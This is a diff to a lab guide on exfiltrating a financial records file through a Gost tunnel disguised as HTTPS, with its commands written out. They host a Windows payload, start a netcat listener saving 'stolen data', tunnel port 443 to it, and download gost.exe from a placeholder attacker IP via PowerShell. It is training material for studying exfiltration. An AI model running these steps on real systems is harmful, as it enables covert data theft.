@@ -1,3 +1,4 @@
+![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)
 
 # Lab: Cloud-Based Services as Exfil using Gost
 
@@ -13,32 +14,31 @@ As an attacker, you already have your tools pre-staged on your server. We need t
 - First things first, navigate to the directory where our tools are located:
 
 ```bash
-cd /home/ubuntu/BnB/GostLab
+cd /BnB/GostLab
 ls -lh
 ```
-
-[Screenshot: ls -lh arătând fișierele gost și gost.exe]
+You will need to use **3 terminals**.
 
 - *Terminal 1:* Start a quick Python web server to host the Windows payload (gost.exe) so the victim machine can download it.
 
 ```bash
-python3 -m http.server 80
+python3 -m http.server 8001
 ```
-[Screenshot: Python http.server ascultând pe portul 80]
+<img width="799" height="60" alt="image" src="https://github.com/user-attachments/assets/6591246d-4aaf-4bd4-a328-0d3f87fcc21f" />
 
 - *Terminal 2:* Start a Netcat listener on port 8080. This is the final destination that will save the incoming stolen data to a file.
 
 ```bash
 nc -lvnp 8080 > exfiltrated_data.csv
 ```
-[Screenshot: Netcat ascultând pe portul 8080]
+<img width="846" height="59" alt="image" src="https://github.com/user-attachments/assets/08c23a18-79ea-4cac-ad9f-f666913f1bb3" />
 
 - *Terminal 3:* Start Gost to listen on port 443 (simulating standard HTTPS traffic) and forward that traffic internally to our Netcat listener. (Note down your Ubuntu VM IP address before running this, you will need it later).
 
 ```bash
 sudo ./gost -L wss://:443/127.0.0.1:8080
 ```
-[Screenshot: Gost rulând pe portul 443 cu un mesaj de pornire]
+<img width="865" height="57" alt="image" src="https://github.com/user-attachments/assets/81e9aa3f-c810-4c2a-93b9-ae0a1f9759e9" />
 
 ---
 
@@ -55,7 +55,7 @@ cat C:\Users\Administrator\Desktop\Labs\GostLab\financial_records.csv
 - Download the Gost payload directly from our Ubuntu server into a temporary folder. Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.
 
 ```powershell
-Invoke-WebRequest -Uri "http://<UBUNTU_IP>/gost.exe" -OutFile "$env:TEMP\gost.exe"
+Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/gost.exe" -OutFile "$env:TEMP\gost.exe"
 ```
 
 [Screenshot: Rularea Invoke-WebRequest fără erori, întorcându-se la prompt]
